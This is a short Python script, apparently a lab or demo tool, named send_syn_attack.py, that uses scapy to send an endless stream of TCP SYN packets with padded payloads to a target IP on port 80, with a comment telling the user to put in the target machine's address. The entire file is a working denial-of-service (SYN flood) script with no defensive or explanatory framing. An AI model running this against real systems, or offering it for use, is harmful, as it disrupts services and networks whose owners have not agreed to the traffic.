# Filename: send_syn_attack.py
from scapy.all import *
import random

target_ip = "192.168.109.190"  # Replace with target machine IP
target_port = 80

while True:
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")/Raw(load="X"*1000)
    send(packet, verbose=False)
    time.sleep(0.1)

